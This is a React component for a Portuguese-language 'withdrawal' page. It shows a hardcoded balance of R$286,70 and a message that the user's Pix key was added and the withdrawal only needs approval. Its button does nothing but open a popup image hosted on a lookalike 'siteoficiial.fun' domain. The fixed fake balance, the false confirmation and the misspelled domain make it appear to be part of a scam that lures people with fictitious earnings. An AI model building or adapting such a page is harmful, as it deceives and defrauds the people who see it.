import './App.css';
import logo from '../../assets/logo-software.jpeg';
import { useState } from 'react';

function SaquePage() {

    const [showPopup, setShowPopup] = useState(false);

    const handlePopupOpen = () => {
        setShowPopup(true);
    };

    const handlePopupClose = () => {
        setShowPopup(false);
    };
    return (
        <div className="saque-container">
            <div className='saque-container-section'>
                <div>
                    <img src={logo} width={100} alt="logo-software" />
                </div>
                <div>
                    <div className="saque-info">
                        <div>
                            <p>Saldo: R$286,70</p>
                        </div>
                    </div>
                </div>
            </div>

            <div className="info-saque">
                <div className="info-saque-img">
                    <img src="https://siteoficiial.fun/wp-content/uploads/2023/08/Captura-de-Tela-2023-08-19-as-20.13.03-e1692498475244.webp" alt="" />
                </div>
                <div>
                    <p>Sua chave pix foi adicionada com sucesso, agora basta clicar no botão abaixo para aprovar o saque</p>
                </div>
                <div className='info-saque-button'>
                    <button className="button-50" role="button" onClick={handlePopupOpen}>Realizar Saque</button>
                </div>
            </div>

            {showPopup && (
                <div className="popup" onClick={handlePopupClose}>
                    <div className="" onClick={(e) => e.stopPropagation()}>
                       
                        <img src="https://siteoficiial.fun/wp-content/uploads/2023/08/novonuagr-1536x400.png" width={'800px'} alt="popuyp" />
                 
                    </div>
                </div>
            )}
        </div>



    )
}

export default SaquePage;